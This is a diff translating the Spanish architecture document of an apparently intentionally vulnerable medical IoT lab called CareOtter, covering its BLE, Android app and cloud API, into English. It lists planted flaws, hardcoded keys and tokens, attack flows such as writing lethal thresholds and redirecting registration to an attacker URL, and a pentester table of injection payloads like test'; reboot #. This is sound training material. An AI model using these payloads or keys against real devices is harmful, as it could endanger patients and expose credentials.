+| `VitalsLogger` | Log to /sdcard | Filesystem |
 
-### 4.2 Flujo de autenticación en la app
+### 4.2 Authentication Flow in the App
 
 ```
 LoginActivity
     │
-    ├──► Detecta prefijo WiFi (ej: 192.168.2.)
-    ├──► Usuario introduce último octeto (ej: 2)
-    ├──► Construye URL: http://192.168.2.2:5002
+    ├──► Detects WiFi prefix (e.g. 192.168.2.)
+    ├──► User enters the last octet (e.g. 2)
+    ├──► Builds URL: http://192.168.2.2:5002
     │
     ├──► POST /api/auth/login
     │     Body: {"username":"...", "password":"..."}
     │
-    ├──► Recibe JWT + role
+    ├──► Receives JWT + role
     │
-    ├──► Guarda en SharedPreferences (sin cifrar):
+    ├──► Stores in SharedPreferences (unencrypted):
     │     jwt_token, user_role, username, api_url, api_prefix, api_host
     │
     └──► routeByRole(role):
@@ -324,149 +462,149 @@ LoginActivity
          else    → MainActivity
 ```
 
-**Vulnerabilidades móviles:**
-1. **HTTP sin TLS**: credenciales y JWT viajan en plaintext.
-2. **JWT en SharedPreferences**: cualquier app con acceso al filesystem puede leer `careotter_prefs.xml`.
-3. **Sin certificate pinning**: un atacante con control de red (ARP spoofing) puede interceptar tráfico.
+**Mobile vulnerabilities:**
+1. **HTTP without TLS**: credentials and JWT travel in plaintext.
+2. **JWT in SharedPreferences**: any app with filesystem access can read `careotter_prefs.xml`.
+3. **No certificate pinning**: an attacker controlling the network (ARP spoofing) can intercept traffic.
 
-### 4.3 MainActivity — Modo paciente (BLE)
+### 4.3 MainActivity — Patient Mode (BLE)
 
 ```
 MainActivity (implements BleMonitorClient.Listener)
     │
-    ├──► startScan() → busca "CareOtter_HR" por nombre
-    │     VULN: no verifica MAC, no requiere emparejamiento
-    │     Cualquier dispositivo BLE con ese nombre es aceptado
+    ├──► startScan() -> looks for "CareOtter_HR" by name
+    │     VULN: does not verify MAC, does not require pairing
+    │     Any BLE device with that name is accepted
     │
     ├──► onServicesDiscovered():
     │     ├── subscribe HR (0x2A37) notify
     │     ├── subscribe PLX (0x2A5F) notify
     │     ├── read Manufacturer (0x2A29)
     │     ├── read Model (0x2A24)
-    │     └── si PROV_SERVICE existe → read PROV_CONFIG
+    │     └── if PROV_SERVICE exists -> read PROV_CONFIG
     │
-    ├──► onCharacteristicChanged(HR) → update UI BPM
-    ├──► onCharacteristicChanged(PLX) → update UI SpO2
+    ├──► onCharacteristicChanged(HR) -> update BPM UI
+    ├──► onCharacteristicChanged(PLX) -> update SpO2 UI
     │
-    ├──► VitalsLogger.log(bpm, spo2) → /sdcard/careotter_vitals.log
-    │     VULN: plaintext, world-readable en Android <10
+    ├──► VitalsLogger.log(bpm, spo2) -> /sdcard/careotter_vitals.log
+    │     VULN: plaintext, world-readable on Android <10
     │
-    └──► Panel diagnóstico oculto: 5 toques rápidos en el título
-         └── Permite leer/escribir thresholds raw en 0xFF01
+        └──► Hidden diagnostic panel: 5 quick taps on the title
+            └── Allows reading/writing raw thresholds in 0xFF01
 ```
 
-**Vulnerabilidades BLE en la app:**
-1. **Missing BLE pairing (M3/CWE-306)**: `connectGatt(context, false, callback)` sin `TRANSPORT_LE` ni bonding.
-2. **No MAC verification**: solo compara `device.getName().equals("CareOtter_HR")`.
-3. **Unencrypted channel (M5/CWE-319)**: no solicita encriptación BLE (`setPairing` no se fuerza).
-4. **Plaintext external storage (M2/CWE-276)**: `VitalsLogger` escribe a `/sdcard/careotter_vitals.log`.
-5. **Hidden diagnostic panel (M1)**: descubrible por análisis estático (variable `diagTapCount`).
-6. **Threshold write sin validación (M3/M7)**: `writeThreshold(String rawJson)` envía bytes tal cual al GATT.
+**BLE vulnerabilities in the app:**
+1. **Missing BLE pairing (M3/CWE-306)**: `connectGatt(context, false, callback)` without `TRANSPORT_LE` or bonding.
+2. **No MAC verification**: it only compares `device.getName().equals("CareOtter_HR")`.
+3. **Unencrypted channel (M5/CWE-319)**: it does not request BLE encryption (`setPairing` is not forced).
+4. **Plaintext external storage (M2/CWE-276)**: `VitalsLogger` writes to `/sdcard/careotter_vitals.log`.
+5. **Hidden diagnostic panel (M1)**: discoverable by static analysis (variable `diagTapCount`).
+6. **Threshold write without validation (M3/M7)**: `writeThreshold(String rawJson)` sends bytes as-is to GATT.
 
-### 4.4 AdminActivity — Modo administrador (IGP v4)
+### 4.4 AdminActivity — Administrator Mode (IGP v4)
 
 ```
 AdminActivity
     │
-    ├──► StrictMode.permitNetwork() → network en UI thread (intencional vuln)
+    ├──► StrictMode.permitNetwork() -> network on UI thread (intentional vuln)
     │
-    ├──► Comandos públicos (sin auth):
-    │     ├── sysInfo()        → IGP 0x01
-    │     ├── verifyStatus()   → IGP 0x05
-    │     └── exploitFormatString() → verifyStatus("%x.%x.%x.%x")
+    ├──► Public commands (no auth):
+    │     ├── sysInfo()        -> IGP 0x01
+    │     ├── verifyStatus()   -> IGP 0x05
+    │     └── exploitFormatString() -> verifyStatus("%x.%x.%x.%x")
     │
-    ├──► Comandos protegidos (execProtected: auth → cmd → deauth):
-    │     ├── getNetwork()     → IGP 0x03
-    │     ├── exploitUnderflow() → IGP 0x04
-    │     ├── defibrillate()   → IGP 0x0B
-    │     ├── exploitCommandInjection() → IGP 0x0C
-    │     └── setTheme()       → IGP 0x04
+    ├──► Protected commands (execProtected: auth -> cmd -> deauth):
+    │     ├── getNetwork()     -> IGP 0x03
+    │     ├── exploitUnderflow() -> IGP 0x04
+    │     ├── defibrillate()   -> IGP 0x0B
+    │     ├── exploitCommandInjection() -> IGP 0x0C
+    │     └── setTheme()       -> IGP 0x04
     │
-    └──► execProtected() abre 3 conexiones TCP separadas
-         VULN: la ventana entre auth y deauth es explotable
+        └──► execProtected() opens 3 separate TCP connections
+            VULN: the window between auth and deauth is exploitable
 ```
 
-**Vulnerabilidades del modo admin:**
-1. **StrictMode network en main thread**: la UI se congela, pero más grave, las excepciones de red pueden crashear la app.
-2. **Token XOR-obfuscado**: `IgpClient.decodeToken()` aplica XOR 0x5A a bytes hardcodeados. El token real es `OtterMobile2026`.
-3. **IGP v4 en plaintext**: TCP sin TLS ni certificados.
+**Admin mode vulnerabilities:**
+1. **StrictMode network on the main thread**: the UI freezes, but more importantly network exceptions can crash the app.
+2. **XOR-obfuscated token**: `IgpClient.decodeToken()` applies XOR 0x5A to hardcoded bytes. The real token is `OtterMobile2026`.
+3. **IGP v4 in plaintext**: TCP without TLS or certificates.
 
 ### 4.5 `CareOtterConfig` — CSCP v1
 
 ```java
-// Clave hardcodeada en Java (idéntica a ble_server.py)
+// Hardcoded key in Java (identical to ble_server.py)
 private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(StandardCharsets.UTF_8);
 
-// Modo ECB (sin IV) → determinístico, vulnerable a replay
+// ECB mode (no IV) -> deterministic, vulnerable to replay
 Cipher.getInstance("AES/ECB/NoPadding");
 ```
 
-**Impacto:** Un atacante que extraiga esta clase del APK (vía `jadx` o `strings`) puede forjar paquetes CSCP v1 válidos y escribir umbrales letales al dispositivo sin necesidad de emparejarse.
+**Impact:** An attacker who extracts this class from the APK (via `jadx` or `strings`) can forge valid CSCP v1 packets and write lethal thresholds to the device without pairing.
 
 ---
 
-## 5. Flujos de Administración
+## 5. Administration Flows
 
-### 5.1 Administración vía BLE (Factory Provisioning)
+### 5.1 BLE Administration (Factory Provisioning)
 
 ```
-Attacker (con proximidad BLE)
+Attacker (with BLE proximity)
     │
-    ├──► Scan BLE → descubre CareOtter_HR
-    │     ├── Lee ManufacturerData → obtiene IP Cloud API + IP WiFi del dispositivo
-    │     └── Enumera servicios GATT → descubre 0xFF10 (no anunciado)
+    ├──► Scan BLE -> discovers CareOtter_HR
+    │     ├── Reads ManufacturerData -> obtains Cloud API IP + device WiFi IP
+    │     └── Enumerates GATT services -> discovers 0xFF10 (not advertised)
     │
-    ├──► Connect GATT → no emparejamiento requerido
+    ├──► Connect GATT -> no pairing required
     │
-    ├──► Write 0xFF12: "1234" → PIN aceptado
+    ├──► Write 0xFF12: "6767" -> PIN accepted
     │
-    ├──► Read 0xFF11 → obtiene wifi_ssid, wifi_psk, cloud_url en plaintext
+    ├──► Read 0xFF11 -> obtains wifi_ssid, wifi_psk, cloud_url in plaintext
     │
     ├──► Write 0xFF11: {"cmd":"wifi_set","ssid":"...","psk":"..."}
-    │     → careservice ejecuta: uci set wireless...@wifi-iface[0].ssid='...' && ...
-    │     → VULN: shell injection si SSID/PSK contienen metacaracteres
+    │     -> careservice executes: uci set wireless...@wifi-iface[0].ssid='...' && ...
+    │     -> VULN: shell injection if SSID/PSK contain metacharacters
     │
     ├──► Write 0xFF11: {"cmd":"cloud_set","url":"http://attacker:5000"}
-    │     → ble_server.py actualiza cloud_url y dispara _send_registration_to_cloud()
-    │     → POST a http://attacker:5000/admin/device/register con firma + credenciales
-    │     → VULN: SSRF — el dispositivo envía datos sensibles a cualquier URL
+    │     -> ble_server.py updates cloud_url and triggers _send_registration_to_cloud()
+    │     -> POST to http://attacker:5000/admin/device/register with signature + credentials
+    │     -> VULN: SSRF - the device sends sensitive data to any URL
     │
     ├──► Write 0xFF11: {"cmd":"factory_reset"}
-    │     → rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
-    │     → Sin confirmación, sin re-autenticación
+    │     -> rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
+    │     -> No confirmation, no re-authentication
     │
-    └──► Write 0xFF01 (CSCP v1 packet con clave robada)
-         → Cambia umbrales a valores letales (bpm_min=0, bpm_max=255, spo2_min=0)
-         → El dispositivo acepta sin validación
+        └──► Write 0xFF01 (CSCP v1 packet with stolen key)
+            -> Changes thresholds to lethal values (bpm_min=0, bpm_max=255, spo2_min=0)
+            -> The device accepts without validation
 ```
 
-### 5.2 Administración vía IGP v4 (TCP :9999)
+### 5.2 IGP v4 Administration (TCP :9999)
 
 ```
-AdminActivity o atacante directo
+AdminActivity or direct attacker
     │
     ├──► TCP connect 192.168.2.1:9999
     │
     ├──► 0x02 AUTHENTICATE payload="OtterMobile2026"
-    │     → authenticated = 1 (global para TODO el proceso)
+    │     -> authenticated = 1 (global for the ENTIRE process)
     │
-    ├──► 0x03 GET_NETWORK → devuelve /etc/config/wireless completo (con PSK)
+    ├──► 0x03 GET_NETWORK -> returns the full /etc/config/wireless (with PSK)
     │
-    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" → format string leak
+    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" -> format string leak
     │
-    ├──► 0x06 SET_WIFI payload="SSID|PSK" → shell injection
+    ├──► 0x06 SET_WIFI payload="SSID|PSK" -> shell injection
     │
-    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" → format string en events.log
+    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" -> format string in events.log
     │
-    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" → command injection → reboot
+    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" -> command injection -> reboot
     │
     └──► 0x0D DEAUTHENTICATE → authenticated = 0
 ```
 
-**Vulnerabilidad de arquitectura (IGP-06):**
-Un atacante que escanee el puerto 9999 puede esperar a que la Cloud API (o un admin legítimo) envíe `0x02 AUTHENTICATE`, y en la ventana entre ese comando y el `0x0D DEAUTHENTICATE`, el atacante conecta y ejecuta comandos protegidos sin credenciales.
+**Architectural vulnerability (IGP-06):**
+An attacker scanning port 9999 can wait for the Cloud API (or a legitimate admin) to send `0x02 AUTHENTICATE`, and in the window between that command and `0x0D DEAUTHENTICATE`, the attacker connects and executes protected commands without credentials.
 
-### 5.3 Administración vía Cloud API (HTTP :5002)
+### 5.3 Cloud API Administration (HTTP :5002)
 
 ```
 Web browser / Mobile app / curl
@@ -474,36 +612,36 @@ Web browser / Mobile app / curl
     ├──► POST /api/auth/login → JWT
     │
     ├──► GET /api/network (token_required)
-    │     → Cloud API hace: auth → 0x03 → deauth al dispositivo
-    │     → Devuelve config WiFi (campo 'raw' con PSK si VULNERABLE=1)
+    │     -> Cloud API does: auth -> 0x03 -> deauth to the device
+    │     -> Returns WiFi config (field 'raw' with PSK if VULNERABLE=1)
     │
     ├──► POST /api/network/wifi (token_required)
     │     → Body: {"ssid":"...", "password":"..."}
-    │     → Cloud API hace: auth → 0x06 → deauth
+    │     -> Cloud API does: auth -> 0x06 -> deauth
     │
     ├──► POST /api/config/preferences (token_required)
     │     → Body: {"tlv_hex": "AAFF4461726B"}
-    │     → Cloud API hace: auth → 0x04 → deauth
-    │     → VULN: TLV underflow proxy
+    │     -> Cloud API does: auth -> 0x04 -> deauth
+    │     -> VULN: TLV underflow proxy
     │
     └──► POST /api/services/restart (token_required)
          → Body: {"service": "medical-sensor"}
-         → Cloud API hace: auth → 0x09 → deauth
+         -> Cloud API does: auth -> 0x09 -> deauth
 ```
 
 ---
 
-## 6. Flujo de Datos de Vitales (End-to-End)
+## 6. Vitals Data Flow (End-to-End)
 
 ```
 ┌──────────────┐     I2C/Sim     ┌──────────────────┐
 │ MAX30102 HW  │◄───────────────►│ sensor_service.py│
 │   o Simulador│                 │  :8081           │
 └──────────────┘                 └────────┬─────────┘
-                                          │ HTTP /vitals ( cada 10s )
+                                          │ HTTP /vitals (every 10s)
                                           ▼
                                    ┌──────────────┐
-                                   │ vitals_snapshot (congelado cada 10s)
+                                   │ vitals_snapshot (frozen every 10s)
                                    └──────┬───────┘
                                           │
                     ┌─────────────────────┼─────────────────────┐
@@ -518,7 +656,7 @@ Web browser / Mobile app / curl
                    ▼                     ▼
             ┌──────────────┐      ┌──────────────┐
             │ SQLite DB    │      │ BLE notify   │
-            │ (Docker)     │      │ (cada 2s)    │
+            │ (Docker)     │      │ (every 2s)   │
             └──────┬───────┘      └──────┬───────┘
                    │                     │
                    ▼                     ▼
@@ -528,131 +666,131 @@ Web browser / Mobile app / curl
             └──────────────┘      └──────────────┘
 ```
 
-**Puntos clave del flujo:**
-1. El sensor genera datos cada 100ms, pero el **snapshot se congela cada 10s**. Esto significa que todos los consumidores ven el mismo valor durante 10s, independientemente de cuándo consulten.
-2. El BLE server refresca su cache cada 30s (`_vitals_refresh_interval`), pero las notificaciones GATT se emiten cada 2s (`update_loop`). Las notificaciones repiten el mismo valor hasta que el cache se refresca.
-3. El Cloud API collector persiste cada lectura exitosa en SQLite. El historial web viene de la DB, no del dispositivo directamente.
+**Key points of the flow:**
+1. The sensor generates data every 100ms, but the **snapshot freezes every 10s**. This means all consumers see the same value for 10s, regardless of when they query.
+2. The BLE server refreshes its cache every 30s (`_vitals_refresh_interval`), but GATT notifications are emitted every 2s (`update_loop`). Notifications repeat the same value until the cache refreshes.
+3. The Cloud API collector persists each successful reading in SQLite. The web history comes from the DB, not directly from the device.
 
 ---
 
-## 7. Vulnerabilidades Arquitectónicas de Diseño
+## 7. Design Architectural Vulnerabilities
 
-### 7.1 Autenticación global en proceso (CWE-362 / CWE-613)
+### 7.1 Global Authentication in Process (CWE-362 / CWE-613)
 
-**Problema:** `authenticated` en `careservice.c` es una variable global (`int authenticated = 0`), no un mapa `socket_fd → bool`.
+**Problem:** `authenticated` in `careservice.c` is a global variable (`int authenticated = 0`), not a `socket_fd -> bool` map.
 
-**Impacto:**
-- Auth en una conexión TCP = auth para todas las conexiones TCP.
-- La Cloud API intenta mitigar esto con `_igp_lock` + auth→cmd→deauth, pero el lock solo serializa peticiones **de la Cloud API**. Un atacante con acceso directo a `:9999` puede conectar en la ventana entre `auth` y `deauth`.
+**Impact:**
+- Auth on one TCP connection = auth for all TCP connections.
+- The Cloud API tries to mitigate this with `_igp_lock` + auth->cmd->deauth, but the lock only serializes requests **from the Cloud API**. An attacker with direct access to `:9999` can connect in the window between `auth` and `deauth`.
 
-**Fix correcto:** Vincular `authenticated` al file descriptor del socket, no al proceso.
+**Correct fix:** Bind `authenticated` to the socket file descriptor, not the process.
 
-### 7.2 Frontera de confianza inexistente en BLE
+### 7.2 Nonexistent Trust Boundary in BLE
 
-**Problema:** Toda la superficie BLE es **completamente abierta**. No hay:
-- Emparejamiento/bonding
-- Encriptación de link
-- Autenticación de sesión
-- Verificación de identidad del dispositivo (solo se compara el nombre)
+**Problem:** The entire BLE surface is **completely open**. There is no:
+- Pairing/bonding
+- Link encryption
+- Session authentication
+- Device identity verification (only the name is compared)
 
-**Impacto:** Cualquier atacante con un dongle BLE ($5) puede:
-- Conectarse al dispositivo
-- Leer PSK WiFi
-- Escribir umbrales letales
-- Ejecutar factory reset
-- Redirigir el registro cloud a un servidor propio
+**Impact:** Any attacker with a $5 BLE dongle can:
+- Connect to the device
+- Read the WiFi PSK
+- Write lethal thresholds
+- Execute factory reset
+- Redirect cloud registration to their own server
 
-### 7.3 Clave simétrica hardcodeada compartida
+### 7.3 Shared Hardcoded Symmetric Key
 
-**Problema:** `CSCP_KEY = "careotter-key-16"` existe en:
+**Problem:** `CSCP_KEY = "careotter-key-16"` exists in:
 - `ble_server.py` (firmware del dispositivo)
 - `CareOtterConfig.java` (APK Android)
 - `forge_threshold.py` (herramienta de pentest)
 
-**Impacto:** Comprometer un solo dispositivo o un solo APK compromete toda la flota. La "encriptación" no proporciona confidencialidad ni autenticación — solo ofusca serialización.
+**Impact:** Compromising a single device or a single APK compromises the entire fleet. The "encryption" provides neither confidentiality nor authentication — it only obscures serialization.
 
-### 7.4 SSRF en la nube médica
+### 7.4 SSRF in the Medical Cloud
 
-**Problema:** `cloud_set` en BLE provisioning acepta cualquier URL sin validación. El dispositivo envía automáticamente:
-- Su firma de fábrica (`CareOtterFactorySig2026`)
-- Credenciales de admin y paciente
-- Su IP WiFi
+**Problem:** `cloud_set` in BLE provisioning accepts any URL without validation. The device automatically sends:
+- Its factory signature (`CareOtterFactorySig2026`)
+- Admin and patient credentials
+- Its WiFi IP
 
-**Impacto:** Un atacante puede configurar `cloud_url` a un dominio que controla y recibir todos los datos de onboarding del dispositivo.
+**Impact:** An attacker can set `cloud_url` to a domain they control and receive all onboarding data from the device.
 
-### 7.5 Autenticación de dos velocidades
+### 7.5 Two-Speed Authentication
 
-**Problema:** Hay tres sistemas de autenticación independientes con diferentes fortalezas:
+**Problem:** There are three independent authentication systems with different strengths:
 
-| Canal | Mecanismo | Fortaleza |
+| Channel | Mechanism | Strength |
 |-------|-----------|-----------|
-| BLE | Ninguno | ⛔ Nulo |
-| IGP v4 | Token hardcodeado | 🔴 Débil |
-| Cloud API | JWT HS256 con secreto débil | 🟡 Mediocre |
-| Cloud API → Device | Mismo token IGP hardcodeado | 🔴 Débil |
+| BLE | None | ⛔ None |
+| IGP v4 | Hardcoded token | 🔴 Weak |
+| Cloud API | JWT HS256 with weak secret | 🟡 Mediocre |
+| Cloud API -> Device | Same hardcoded IGP token | 🔴 Weak |
 
-Un atacante puede pivotar del canal más débil (BLE, sin auth) al más fuerte (Cloud API) vía `cloud_set` + captura de firma.
+An attacker can pivot from the weakest channel (BLE, no auth) to the strongest (Cloud API) via `cloud_set` + signature capture.
 
-### 7.6 Persistencia de estado sensible sin caducidad
+### 7.6 Sensitive State Persistence Without Expiration
 
-**Problema:**
-- `_PROVISION_FILE` (`/tmp/careotter-provision.json`) persiste credenciales WiFi, cloud, patient y admin.
-- El campo `initialized_at` se escribe pero **nunca se consulta**. El canal de provisioning nunca caduca (vulnerabilidad P8).
-- SQLite en Docker persiste en volumen `careotter_data` a través de `docker compose down` (a menos que se use `-v`).
+**Problem:**
+- `_PROVISION_FILE` (`/tmp/careotter-provision.json`) persists WiFi, cloud, patient, and admin credentials.
+- The `initialized_at` field is written but **never checked**. The provisioning channel never expires (vulnerability P8).
+- SQLite in Docker persists in the `careotter_data` volume across `docker compose down` (unless `-v` is used).
 
 ---
 
-## 8. Mapa de dependencias entre archivos
+## 8. File Dependency Map
 
 ```
 careservice.c
-    ├── lee/escribe: /tmp/careservice.log
-    ├── lee/escribe: /tmp/careotter_events.log
-    ├── lee/escribe: /tmp/careotter.thresholds  ◄────── sensor_service.py (watcher)
-    ├── lee: /etc/config/wireless
-    ├── lee: /etc/careotter/alert.conf
-    └── ejecuta: /etc/init.d/* (via fork/execv)
+    ├── reads/writes: /tmp/careservice.log
+    ├── reads/writes: /tmp/careotter_events.log
+    ├── reads/writes: /tmp/careotter.thresholds  ◄────── sensor_service.py (watcher)
+    ├── reads: /etc/config/wireless
+    ├── reads: /etc/careotter/alert.conf
+    └── executes: /etc/init.d/* (via fork/execv)
 
 sensor_service.py
-    ├── lee: /opt/medical-sensor/config.json
-    ├── lee: /tmp/careotter.thresholds
-    ├── escribe: /tmp/medical-logs/vitals.log
-    └── usa: simulator.py (o smbus2 real)
+    ├── reads: /opt/medical-sensor/config.json
+    ├── reads: /tmp/careotter.thresholds
+    ├── writes: /tmp/medical-logs/vitals.log
+    └── uses: simulator.py (or real smbus2)
 
 ble_server.py
-    ├── lee/escribe: /tmp/careotter-provision.json
-    ├── consulta: http://127.0.0.1:8081/vitals
-    ├── consulta: Cloud API /api/health (para obtener wifi_ip)
-    └── envía: POST Cloud_API/admin/device/register
+    ├── reads/writes: /tmp/careotter-provision.json
+    ├── queries: http://127.0.0.1:8081/vitals
+    ├── queries: Cloud API /api/health (to obtain wifi_ip)
+    └── sends: POST Cloud_API/admin/device/register
 
 Cloud API (app.py)
-    ├── consulta: http://DEVICE_IP:8081/health (para MAC)
-    ├── consulta: http://DEVICE_IP:8081/vitals (collector)
-    ├── habla: TCP DEVICE_IP:9999 (IGPClient)
-    └── escribe: SQLite /app/data/careotter.db
+    ├── queries: http://DEVICE_IP:8081/health (for MAC)
+    ├── queries: http://DEVICE_IP:8081/vitals (collector)
+    ├── talks to: TCP DEVICE_IP:9999 (IGPClient)
+    └── writes: SQLite /app/data/careotter.db
 
 Android App
-    ├── habla: HTTP Cloud_API:5002
-    ├── habla: BLE GATT CareOtter_HR
-    └── habla: TCP 192.168.2.1:9999 (modo admin)
+    ├── talks to: HTTP Cloud_API:5002
+    ├── talks to: BLE GATT CareOtter_HR
+    └── talks to: TCP 192.168.2.1:9999 (admin mode)
 ```
 
 ---
 
-## 9. Resumen ejecutivo para pentesters
+## 9. Executive Summary for Pentesters
 
-| Si quieres explotar... | Usa este canal | Comando/payload clave |
+| If you want to exploit... | Use this channel | Key command/payload |
 |------------------------|---------------|----------------------|
 | Hardcoded credential | IGP v4 | `0x02` + `OtterMobile2026` |
-| WiFi PSK disclosure | IGP v4 / BLE | `0x03` o read `0xFF11` |
-| Shell injection | IGP v4 / BLE | `0x06` SSID=`'; touch /tmp/pwn #` o `wifi_set` |
-| Format string leak | IGP v4 / API | `0x05` module=`%x.%x.%x` o `/api/device/status?module=...` |
+| WiFi PSK disclosure | IGP v4 / BLE | `0x03` or read `0xFF11` |
+| Shell injection | IGP v4 / BLE | `0x06` SSID=`'; touch /tmp/pwn #` or `wifi_set` |
+| Format string leak | IGP v4 / API | `0x05` module=`%x.%x.%x` or `/api/device/status?module=...` |
 | Command injection | IGP v4 | `0x0C` payload=`test'; reboot #` |
 | Buffer overflow | IGP v4 | `0x04` TLV `AA FF 44 61 72 6B` |
-| BLE threshold attack | BLE GATT | CSCP v1 packet con `bpm_min=0, bpm_max=255` |
-| SSRF / Cloud hijack | BLE GATT | `cloud_set` → URL del atacante |
-| JWT forgery | Cloud API | Firmar con `careotter_jwt_2026` |
-| Weak password crack | Cloud API | SHA-256 rainbow table de `CareOtter2026!` |
-| RCE en Cloud API | Cloud API | Provocar error 500 en `VULNERABLE=1` → Werkzeug PIN |
-| Unauthorized admin | Cloud API | `POST /initialize_iot` si DB vacía |
-| Privilege escalation | Cloud API | Paciente accede a `/api/devices` (sin check de rol) |
+| BLE threshold attack | BLE GATT | CSCP v1 packet with `bpm_min=0, bpm_max=255` |
+| SSRF / Cloud hijack | BLE GATT | `cloud_set` -> attacker URL |
+| JWT forgery | Cloud API | Sign with `careotter_jwt_2026` |
+| Weak password crack | Cloud API | SHA-256 rainbow table for `CareOtter2026!` |
+| RCE in Cloud API | Cloud API | Trigger 500 error in `VULNERABLE=1` -> Werkzeug PIN |
+| Unauthorized admin (fallback, out of scope) | Cloud API | `GET /initialize_iot` if DB empty — lab playability only, not an attack chain |
+| Privilege escalation | Cloud API | Patient accesses `/api/devices` (no role check) |
